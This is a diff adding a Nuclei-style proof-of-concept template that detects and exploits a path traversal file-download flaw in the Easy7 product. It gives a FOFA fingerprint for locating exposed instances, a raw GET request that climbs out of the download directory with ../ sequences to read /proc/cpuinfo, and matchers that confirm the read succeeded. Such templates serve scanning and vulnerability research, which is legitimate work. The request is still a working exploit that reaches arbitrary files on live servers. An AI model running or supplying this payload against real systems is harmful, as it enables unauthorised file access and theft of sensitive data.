@@ -1,0 +1,27 @@
+id: poc-Easy7-downloadWordRecord-download
+
+info:
+  name: poc-Easy7-downloadWordRecord-download
+  author: PokerSec
+  severity: high
+  metadata:
+    fofa-search: body="/images/ico/Easy7_logo_transparent.png"
+
+requests:
+  - raw:
+      - |-
+        GET /Easy7/rest/file/downloadWordRecord?fileName=../../../../../../../proc/cpuinfo HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'vendor_id'
+          - 'fpu_exception'
+          - 'cpu family'
+        condition: and
+      - type: status
+        status:
+          - 200
